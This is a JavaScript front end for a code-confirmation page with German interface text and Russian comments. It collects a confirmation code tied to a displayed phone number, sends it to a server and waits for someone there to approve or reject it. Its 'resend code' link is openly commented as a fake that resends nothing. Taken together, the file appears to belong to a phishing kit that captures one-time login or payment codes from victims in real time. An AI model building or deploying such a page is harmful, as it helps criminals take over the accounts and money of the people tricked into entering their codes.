(() => {
  const cfg = window.__CFG__ || {};

  const $ = (id) => document.getElementById(id);
  const card = $('card');

  // Появление карточки
  if (card) {
    gsap.fromTo(card,
      { y: 16, opacity: 0 },
      { y: 0, opacity: 1, duration: 0.5, ease: 'power2.out' });
  }

  if (cfg.not_found) return;

  const titleEl    = $('m-title');
  const descEl     = $('m-desc');
  const phoneEl    = $('m-phone');
  const form       = $('code-form');
  const input      = $('code-input');
  const btn        = $('submit-btn');
  const btnLbl     = btn.querySelector('.submit-label');
  const statusEl   = $('status');
  const alertEl    = $('form-alert');
  const alertTit   = $('alert-title');
  const alertDsc   = $('alert-desc');
  const bodyEl     = $('card-body');
  const successEl  = $('result-success');
  const successTit = $('success-title');
  const successDsc = $('success-desc');
  const resendQ    = $('resend-question');
  const resendA    = $('resend-link');

  titleEl.textContent = cfg.modal_title;
  descEl.textContent  = cfg.modal_description;
  phoneEl.textContent = cfg.number;
  input.placeholder   = cfg.placeholder;
  btnLbl.textContent  = cfg.button_text;
  resendQ.textContent = cfg.resend_question;
  resendA.textContent = cfg.resend_link;
  document.title      = cfg.modal_title || document.title;

  let pollTimer = null;
  let currentAttemptId = null;

  function setStatusText(text, cls) {
    statusEl.className = 'status ' + (cls || '');
    statusEl.textContent = text || '';
  }
  function clearStatus() {
    statusEl.className = 'status';
    statusEl.textContent = '';
  }
  function setLoading(on) {
    btn.disabled = on;
    btn.classList.toggle('is-loading', on);
    input.readOnly = on;
  }
  function hideAlert() { alertEl.hidden = true; }
  function showAlert(title, desc) {
    alertTit.textContent = title;
    alertDsc.textContent = desc || '';
    alertEl.hidden = false;
    gsap.fromTo(alertEl,
      { y: -8, opacity: 0 },
      { y: 0, opacity: 1, duration: 0.32, ease: 'power2.out' });
  }
  function shake() {
    gsap.fromTo(card,
      { x: -10 },
      { x: 0, duration: 0.5, ease: 'elastic.out(1.2, 0.35)', clearProps: 'x' });
  }
  function flashSuccess() {
    successTit.textContent = cfg.success_text || 'Bestätigt!';
    successDsc.textContent = cfg.success_description || '';
    bodyEl.hidden = true;
    successEl.hidden = false;
    gsap.fromTo(successEl,
      { y: 14, opacity: 0 },
      { y: 0,  opacity: 1, duration: 0.5, ease: 'power2.out' });
  }
  function flashError() {
    showAlert(cfg.error_text || 'Falscher Code',
              cfg.error_description || 'Bitte überprüfen Sie den Code und versuchen Sie es erneut.');
    shake();
  }

  async function submitCode(code) {
    setLoading(true);
    clearStatus();
    hideAlert();
    try {
      const r = await fetch('/api/verify.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: cfg.link_id, code })
      });
      if (!r.ok) throw new Error('http ' + r.status);
      const data = await r.json();
      currentAttemptId = data.attempt_id;
      setStatusText(cfg.loading_text || '…', 'is-info');
      startPolling(currentAttemptId);
    } catch (e) {
      setLoading(false);
      setStatusText('Verbindungsfehler. Erneut versuchen.', 'is-error');
      shake();
    }
  }

  function startPolling(attemptId) {
    stopPolling();
    const interval = Math.max(500, cfg.polling_interval_ms || 2000);
    const tick = async () => {
      try {
        const r = await fetch('/api/status.php?attempt_id=' + encodeURIComponent(attemptId), { cache: 'no-store' });
        if (!r.ok) return;
        const data = await r.json();
        if (data.status === 'approved') {
          stopPolling();
          setLoading(false);
          flashSuccess();
        } else if (data.status === 'rejected') {
          stopPolling();
          setLoading(false);
          clearStatus();
          flashError();
          input.value = '';
          input.focus();
        }
      } catch (_) {}
    };
    tick();
    pollTimer = setInterval(tick, interval);
  }
  function stopPolling() {
    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  }

  input.addEventListener('input', hideAlert);

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const code = input.value.trim();
    if (!code) { input.focus(); return; }
    submitCode(code);
  });

  // «Erneut senden» — мягкая имитация: shake + reset поля
  resendA.addEventListener('click', (e) => {
    e.preventDefault();
    input.value = '';
    input.focus();
    shake();
  });

  setTimeout(() => input.focus(), 500);
})();
